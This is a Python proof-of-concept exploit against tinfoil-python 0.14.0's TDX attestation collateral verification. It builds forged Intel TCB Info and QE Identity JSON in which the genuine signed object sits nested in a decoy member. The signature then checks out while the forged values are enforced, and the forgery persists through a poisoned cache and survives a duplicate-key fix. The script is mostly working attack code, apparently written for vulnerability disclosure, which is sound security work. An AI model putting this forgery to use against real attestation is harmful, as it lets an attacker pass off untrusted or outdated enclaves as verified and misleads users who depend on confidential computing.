"""
PoC: tinfoil-python 0.14.0 -- NESTED-OBJECT variant of the collateral signature
differential (collateral_tdx._verify_collateral_signature).

Known finding #2 appends a DUPLICATE top-level "tcbInfo"/"enclaveIdentity" key.
This variant uses NO duplicate keys at any nesting level: the genuine,
Intel-signed object is parked inside a decoy member that precedes the forged
top-level member:

    {"_":{"tcbInfo":<GENUINE>},"tcbInfo":<FORGED>,"signature":"<GENUINE SIG>"}

_verify_collateral_signature() locates the FIRST occurrence of '"tcbInfo":' with
str.find and only checks that the character before it is '{' or ','  -- which is
also true for a nested object's opening brace -- so the signature is verified
over <GENUINE> while json.loads()["tcbInfo"] returns <FORGED>.

Consequence for remediation: rejecting duplicate keys (object_pairs_hook, as the
V3 spec / known report suggest) does NOT close this hole; only verifying the
signature over the exact bytes that are enforced does.

Inputs: genuine Intel-signed PCS collateral (go-tdx-guest v0.3.1 testdata, 2023).
Knobs: clock frozen to 2023-06-30 (collateral + TCB Signing cert validity);
requests.get replaced by a stand-in for https://tdx-proxy.tinfoil.sh (attacker);
empty private cache dir. No verification code is patched.

Usage: python -I poc_nested_key.py <data_dir>
"""
import base64
import copy
import dataclasses
import datetime as _dt
import gzip
import json
import os
import sys
import tempfile
from unittest import mock

import requests
from cryptography import x509
from cryptography.hazmat.primitives import serialization

import tinfoil
import tinfoil.attestation.cert_utils as cu
import tinfoil.attestation.collateral_tdx as ct
import tinfoil.attestation.attestation_tdx as at
from tinfoil.attestation.attestation import Document
from tinfoil.attestation.types import PredicateType
from tinfoil.attestation.abi_tdx import parse_quote

DATA = sys.argv[1]
FROZEN = _dt.datetime(2023, 6, 30, tzinfo=_dt.timezone.utc)


class FrozenDateTime(_dt.datetime):
    @classmethod
    def now(cls, tz=None):
        return FROZEN.astimezone(tz) if tz else FROZEN.replace(tzinfo=None)


cu.datetime = FrozenDateTime
ct.datetime = FrozenDateTime


def rd(name, mode="rb"):
    with open(os.path.join(DATA, name), mode) as f:
        return f.read()


QUOTE = rd("quote.dat")
GENUINE_TCB = rd("tcb_info.json").rstrip()
GENUINE_QE = rd("qe_identity.json").rstrip()
TCB_CHAIN = rd("tcbInfoIssuerChain.txt", "r").strip()
QE_CHAIN = rd("qeIdentityIssuerChain.txt", "r").strip()
PCKCRL_CHAIN = rd("pckCrlIssuerChain.txt", "r").strip()
PCK_CRL_PEM = x509.load_der_x509_crl(rd("pckcrl.der")).public_bytes(serialization.Encoding.PEM)
ROOT_CRL_DER = rd("rootcrl.der")


# ---------------------------------------------------------------------------
# attacker transforms
# ---------------------------------------------------------------------------
def split_genuine(genuine: bytes, key: str):
    """Return (genuine_inner_object_bytes, genuine_signature_hex) from Intel's response."""
    text = genuine.decode()
    pat = f'"{key}":'
    pos = text.find(pat)
    assert pos == 1, "expected the signed key to be the first member"
    start = pos + len(pat)
    _, end = json.JSONDecoder().raw_decode(text, start)
    inner = text[start:end].encode()
    sig = json.loads(genuine)["signature"]
    return inner, sig


def nested_forgery(genuine: bytes, key: str, forged_obj: dict) -> bytes:
    """NO duplicate keys anywhere: park the genuine signed object under a decoy
    member that precedes the forged top-level member."""
    inner, sig = split_genuine(genuine, key)
    forged = json.dumps(forged_obj, separators=(",", ":")).encode()
    return b'{"_":{"' + key.encode() + b'":' + inner + b'},"' + key.encode() + b'":' + forged + b',"signature":"' + sig.encode() + b'"}'


def dup_forgery(genuine: bytes, key: str, forged_obj: dict) -> bytes:
    """Known finding #2 transform (duplicate top-level key)."""
    assert genuine.endswith(b"}")
    return genuine[:-1] + b',"' + key.encode() + b'":' + json.dumps(
        forged_obj, separators=(",", ":")).encode() + b"}"


def assert_no_duplicate_keys(raw: bytes) -> None:
    def hook(pairs):
        keys = [k for k, _ in pairs]
        if len(keys) != len(set(keys)):
            raise ValueError(f"duplicate keys: {sorted(k for k in keys if keys.count(k) > 1)}")
        return dict(pairs)
    json.loads(raw, object_pairs_hook=hook)


_ORIG_LOADS = json.loads


def strict_loads(s, *a, **kw):
    """A 'fixed' parser that rejects duplicate keys -- the fix suggested for the known finding."""
    def hook(pairs):
        keys = [k for k, _ in pairs]
        if len(keys) != len(set(keys)):
            raise ct.CollateralError("duplicate JSON member rejected (strict parser)")
        return dict(pairs)
    kw["object_pairs_hook"] = hook
    return _ORIG_LOADS(s, *a, **kw)


# ---------------------------------------------------------------------------
# stand-in for the collateral delivery path (tdx-proxy.tinfoil.sh)
# ---------------------------------------------------------------------------
def make_proxy(tcb_body: bytes, qe_body: bytes, log: list):
    def _get(url, timeout=None, **kw):
        log.append(url)
        assert url.startswith("https://tdx-proxy.tinfoil.sh/"), url
        r = requests.Response()
        r.status_code = 200
        r.url = url
        if "/tdx/certification/v4/tcb?" in url:
            r._content = tcb_body
            r.headers["TCB-Info-Issuer-Chain"] = TCB_CHAIN
        elif "/tdx/certification/v4/qe/identity" in url:
            r._content = qe_body
            r.headers["SGX-Enclave-Identity-Issuer-Chain"] = QE_CHAIN
        elif "/sgx/certification/v4/pckcrl?ca=platform" in url:
            r._content = PCK_CRL_PEM
            r.headers["SGX-PCK-CRL-Issuer-Chain"] = PCKCRL_CHAIN
        elif url.endswith("/certificates.trustedservices.intel.com/IntelSGXRootCA.der"):
            r._content = ROOT_CRL_DER
        else:
            raise AssertionError(f"unexpected URL {url}")
        return r
    return _get


def _no_network(*a, **k):
    raise AssertionError("network must not be used")


def run(label, tcb_body, qe_body, cfg, cache_dir, network=True, strict=False):
    log = []
    getter = make_proxy(tcb_body, qe_body, log) if network else _no_network
    doc = Document(format=PredicateType.TDX_GUEST_V2,
                   body=base64.b64encode(gzip.compress(QUOTE)).decode())
    patches = [mock.patch.object(ct, "_TDX_CACHE_DIR", cache_dir),
               mock.patch.object(ct.requests, "get", getter),
               mock.patch.object(at, "_DEFAULT_CONFIG", cfg)]
    if strict:
        # simulate the dup-key fix: every json.loads in collateral_tdx rejects duplicates
        patches.append(mock.patch.object(ct.json, "loads", strict_loads))
    for p in patches:
        p.start()
    try:
        v = doc.verify()
        res = at.verify_tdx_attestation(doc.body, config=cfg)
        print(f"[{label}] ACCEPTED by Document.verify(): tls_fp={v.public_key_fp[:16]}... hpke={v.hpke_public_key[:16]}...")
        print(f"      tcb_level.status={res.tcb_level.tcb_status.value} "
              f"tcbEvalNum(TCB Info)={res.collateral.tcb_info.tcb_info.tcb_evaluation_data_number} "
              f"nextUpdate={res.collateral.tcb_info.tcb_info.next_update} "
              f"QE mrsigner used={res.collateral.qe_identity.enclave_identity.mrsigner.hex()[:16]}...")
        return True
    except Exception as e:  # noqa: BLE001
        print(f"[{label}] REJECTED: {type(e).__name__}: {str(e)[:160]}")
        return False
    finally:
        for p in reversed(patches):
            p.stop()
        if log:
            print("      fetched:", *sorted(set(log)), sep="\n        ")


def main():
    print("tinfoil package:", tinfoil.__file__)
    q = parse_quote(QUOTE)
    b = q.td_quote_body
    shipped = at.TdxVerificationConfig()
    # the 2023 sample quote predates the shipped MR_SEAM/TD_ATTRIBUTES/XFAM pins;
    # align those policy constants with the sample (none of this touches collateral logic)
    cfg = dataclasses.replace(
        shipped,
        accepted_mr_seams=(b.mr_seam,),
        expected_td_attributes=b.td_attributes,
        expected_xfam=b.xfam,
        expected_minimum_tee_tcb_svn=b.tee_tcb_svn,
    )
    assert cfg.min_tcb_evaluation_data_number == ct.DEFAULT_MIN_TCB_EVALUATION_DATA_NUMBER == 19

    # ---- forged objects (same forgery as known PoC: all-zero TCB level UpToDate, fresh dates) ----
    genuine_tcb = json.loads(GENUINE_TCB)["tcbInfo"]
    forged_tcb = copy.deepcopy(genuine_tcb)
    zero16 = [{"svn": 0} for _ in range(16)]
    forged_tcb.update(
        tcbEvaluationDataNumber=99,
        nextUpdate="2099-01-01T00:00:00Z",
        tcbLevels=[{"tcb": {"sgxtcbcomponents": zero16, "pcesvn": 0, "tdxtcbcomponents": zero16},
                    "tcbDate": "2023-02-15T00:00:00Z", "tcbStatus": "UpToDate"}],
        tdxModuleIdentities=[{"id": "TDX_00", "mrsigner": "00" * 48, "attributes": "0000000000000000",
                              "attributesMask": "FFFFFFFFFFFFFFFF",
                              "tcbLevels": [{"tcb": {"isvsvn": 0}, "tcbDate": "2023-02-15T00:00:00Z",
                                             "tcbStatus": "UpToDate"}]}],
    )
    genuine_qe = json.loads(GENUINE_QE)["enclaveIdentity"]
    forged_qe = copy.deepcopy(genuine_qe)
    forged_qe.update(tcbEvaluationDataNumber=99, nextUpdate="2099-01-01T00:00:00Z")
    # (MRSIGNER kept = Intel's; the known report already shows MRSIGNER itself is forgeable the same way)
    forged_qe_mrsigner = copy.deepcopy(forged_qe)
    forged_qe_mrsigner.update(mrsigner="41" * 32)

    nested_tcb = nested_forgery(GENUINE_TCB, "tcbInfo", forged_tcb)
    nested_qe = nested_forgery(GENUINE_QE, "enclaveIdentity", forged_qe)
    nested_qe_mrsigner = nested_forgery(GENUINE_QE, "enclaveIdentity", forged_qe_mrsigner)
    dup_tcb = dup_forgery(GENUINE_TCB, "tcbInfo", forged_tcb)
    dup_qe = dup_forgery(GENUINE_QE, "enclaveIdentity", forged_qe)

    print("\nnested TCB Info wire bytes (head/tail):")
    print("  ", nested_tcb[:70], b"...", nested_tcb[-150:])
    assert_no_duplicate_keys(nested_tcb)
    assert_no_duplicate_keys(nested_qe)
    print("  -> strict duplicate-key parser accepts both nested forgeries (no duplicate member anywhere)")
    try:
        assert_no_duplicate_keys(dup_tcb)
        raise SystemExit("dup forgery unexpectedly has no duplicate keys")
    except ValueError as e:
        print("  -> known dup-key forgery is caught by a strict parser:", e)

    # unit level: the signature routine verifies Intel's signature over the NESTED (genuine)
    # object while the parser returns the FORGED one
    chain = ct._parse_issuer_chain_header(TCB_CHAIN)
    parsed = ct.parse_tcb_info_response(nested_tcb)
    ct.verify_tcb_info_signature(nested_tcb, parsed, chain)
    print("\n[unit] verify_tcb_info_signature(nested) passed; enforced tcbInfo: "
          f"tcbEvalNum={parsed.tcb_info.tcb_evaluation_data_number} "
          f"levels={[l.tcb_status.value for l in parsed.tcb_info.tcb_levels]} "
          f"nextUpdate={parsed.tcb_info.next_update.date()}")
    parsed_qe = ct.parse_qe_identity_response(nested_qe_mrsigner)
    ct.verify_qe_identity_signature(nested_qe_mrsigner, parsed_qe, ct._parse_issuer_chain_header(QE_CHAIN))
    print(f"[unit] verify_qe_identity_signature(nested) passed; enforced mrsigner={parsed_qe.enclave_identity.mrsigner.hex()}")

    results = {}
    with tempfile.TemporaryDirectory() as d:
        print("\n== A control: genuine Intel collateral, shipped config")
        results["A"] = run("A", GENUINE_TCB, GENUINE_QE, cfg, os.path.join(d, "A"))
        print("\n== B attack: NESTED forgery of tcbInfo + enclaveIdentity (no duplicate keys)")
        results["B"] = run("B", nested_tcb, nested_qe, cfg, os.path.join(d, "B"))
        print("\n== C persistence: later session, no network -> served from B's poisoned cache")
        results["C"] = run("C", None, None, cfg, os.path.join(d, "B"), network=False)
        print("\n== D ablation: duplicate-key forgery under a dup-key-rejecting parser (the obvious fix)")
        results["D"] = run("D", dup_tcb, dup_qe, cfg, os.path.join(d, "D"), strict=True)
        print("\n== E attack: NESTED forgery under the same dup-key-rejecting parser")
        results["E"] = run("E", nested_tcb, nested_qe, cfg, os.path.join(d, "E"), strict=True)
    print("\nSUMMARY:", {k: ("ACCEPT" if v else "REJECT") for k, v in results.items()})
    expected = dict(A=False, B=True, C=True, D=False, E=True)
    print("matches expected:", results == expected)
    return 0 if results == expected else 1


if __name__ == "__main__":
    sys.exit(main())
